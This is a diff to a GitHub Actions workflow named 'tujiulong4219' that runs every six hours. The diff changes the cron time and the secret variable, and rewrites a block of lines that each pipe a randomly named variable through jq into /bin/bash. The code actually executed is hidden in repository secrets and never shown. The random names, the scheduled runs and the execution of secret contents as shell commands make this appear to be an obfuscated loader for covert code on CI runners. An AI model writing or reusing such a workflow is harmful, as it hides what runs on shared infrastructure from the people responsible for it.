@@ -2,7 +2,7 @@ name: tujiulong4219
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 1/6 * * *'
+    - cron: '11 4/6 * * *'
 
 jobs:
   build:
@@ -12,16 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: tujiulong4219
         env:
-          y07281: ${{ secrets.y07281 }}
+          m8: ${{ secrets.m8 }}
         run: |
-          echo $y07281 | jq -r .i61 | /bin/bash
-          echo $lvxmi85433 | jq -r .gwhs41 | /bin/bash
-          echo $hkbx419 | jq -r .h35119 | /bin/bash
-          echo $dafm457 | jq -r .n74 | /bin/bash
-          echo $v1 | jq -r .wauok57099 | /bin/bash
-          echo $qyq198 | jq -r .zsbwe73033 | /bin/bash
-          echo $r6 | jq -r .jaj95720 | /bin/bash
-          echo $eegy2345 | jq -r .w18604 | /bin/bash
-          echo $a8234 | jq -r .j29 | /bin/bash
-          echo $sop45240 | jq -r .z6216 | /bin/bash
+          echo $m8 | jq -r .lsno2 | /bin/bash
+          echo $as54523 | jq -r .xwqes69645 | /bin/bash
+          echo $z5 | jq -r .fjsz28095 | /bin/bash
+          echo $u8746 | jq -r .hd694 | /bin/bash
+          echo $if411 | jq -r .s66 | /bin/bash
+          echo $qxut19684 | jq -r .ns362 | /bin/bash
+          echo $zxou4 | jq -r .fx58 | /bin/bash
+          echo $l836 | jq -r .xhl65 | /bin/bash
+          echo $b69 | jq -r .rzw0922 | /bin/bash
+          echo $fxgy1419 | jq -r .wi9 | /bin/bash
+          echo $l262 | jq -r .z3346 | /bin/bash
 
